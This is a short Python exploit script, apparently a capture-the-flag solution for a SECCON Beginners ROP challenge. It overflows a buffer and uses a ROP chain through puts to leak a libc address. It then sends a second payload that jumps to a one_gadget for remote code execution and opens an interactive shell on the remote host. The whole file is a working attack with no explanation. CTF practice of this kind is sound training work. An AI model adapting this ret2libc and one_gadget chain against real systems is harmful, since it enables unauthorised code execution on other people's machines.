from ptrlib import *

offset = 0x108
elf = ELF('./chall')
libc = ELF('./libc-2.27.so')
pop_rdi = 0x401283 # : pop rdi ; ret
ret = 0x40101a # : ret

sock = Socket('beginners-rop.quals.beginners.seccon.jp', 4102)

# 0x4f432
# 0x10a41c
one_gadget_addr = 0x4f3d5

# leak libc
payload = b'A' * offset
payload += flat([
    p64(ret),
    p64(pop_rdi),
    p64(elf.got('puts')),
    p64(elf.plt('puts')),
    p64(ret),
    p64(elf.symbol('main')),
])
sock.sendline(payload)
sock.recvline()

puts_addr = u64(sock.recv(8))
print("puts = ", hex(puts_addr))
libc.base = puts_addr - libc.symbol('puts')
print("libc = ", hex(libc.base))
one_gadget = libc.base + one_gadget_addr
print("one_gadget = ", hex(one_gadget))

# exec one gadget rce
payload = b'A' * offset
payload += flat([
    p64(ret),
    p64(ret),
    p64(one_gadget),
])
sock.sendline(payload)

sock.interactive()
